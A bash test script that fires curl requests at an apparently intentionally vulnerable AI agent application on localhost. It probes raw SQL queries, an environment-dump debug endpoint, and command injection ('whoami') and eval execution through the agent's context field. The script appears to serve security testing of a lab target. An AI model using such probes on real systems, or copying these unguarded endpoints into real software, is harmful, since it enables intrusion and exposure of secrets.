#!/bin/bash

API_URL="http://localhost:8000"

echo "================================================"
echo "Testing Vulnerable Agent Application"
echo "================================================"
echo ""

echo "1. Testing API Gateway Health..."
curl -s "$API_URL/" | jq .
echo ""

echo "2. Testing SQL Injection via /api/user endpoint..."
curl -s "$API_URL/api/user/user-001" | jq .
echo ""

echo "3. Testing Direct SQL Query (Raw SQL Injection)..."
curl -s -X POST "$API_URL/api/query" \
  -H "Content-Type: application/json" \
  -d '{"query": "SELECT * FROM sensitive_data"}' | jq .
echo ""

echo "4. Testing Debug Endpoint (Information Disclosure)..."
curl -s "$API_URL/api/debug/env" | jq . | head -20
echo ""

echo "5. Testing Agent Execution..."
curl -s -X POST "$API_URL/api/agent/execute" \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "user-001",
    "prompt": "query data from database",
    "context": {},
    "tools": []
  }' | jq .
echo ""

echo "6. Testing Command Injection via Task Agent..."
curl -s -X POST "$API_URL/api/agent/execute" \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "user-001",
    "prompt": "execute command",
    "context": {"command": "whoami"},
    "tools": []
  }' | jq .
echo ""

echo "7. Testing Code Execution via eval..."
curl -s -X POST "$API_URL/api/agent/execute" \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "user-001",
    "prompt": "execute command",
    "context": {"eval": "2 + 2"},
    "tools": []
  }' | jq .
echo ""

echo "================================================"
echo "Vulnerability Tests Complete"
echo "================================================"


